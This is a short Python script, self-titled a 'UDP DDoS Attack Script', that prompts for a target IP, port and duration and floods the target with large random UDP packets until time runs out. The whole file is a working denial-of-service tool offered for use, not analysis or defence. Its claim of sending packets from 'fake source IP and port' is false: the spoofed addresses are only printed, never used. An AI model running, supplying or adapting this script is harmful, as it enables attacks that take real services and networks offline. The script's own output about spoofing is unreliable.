import socket
import random
import time

print("UDP DDoS Attack Script\n")

target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port number: "))

duration = int(input("Enter duration of attack in seconds: "))

# Create a UDP socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random data to send in packets
data = random._urandom(10240)

print("\nStarting UDP Mix attack on %s:%s for %s seconds..." % (target_ip, target_port, duration))

# Keep track of the number of packets sent
packet_count = 0

# Keep track of the start time
start_time = time.time()

while (time.time() - start_time) < duration:
    # Send a UDP packet with fake source IP and port
    fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    fake_port = random.randint(1, 65535)

    # Create the UDP packet
    packet = data + str(packet_count).encode('utf-8')

    # Send the packet to the target
    sock.sendto(packet, (target_ip, target_port))

    # Print packet details
    print("Packet sent to %s:%s from %s:%s (%s bytes)" % (target_ip, target_port, fake_ip, fake_port, len(packet)))

    packet_count += 1

print("\nAttack finished.")
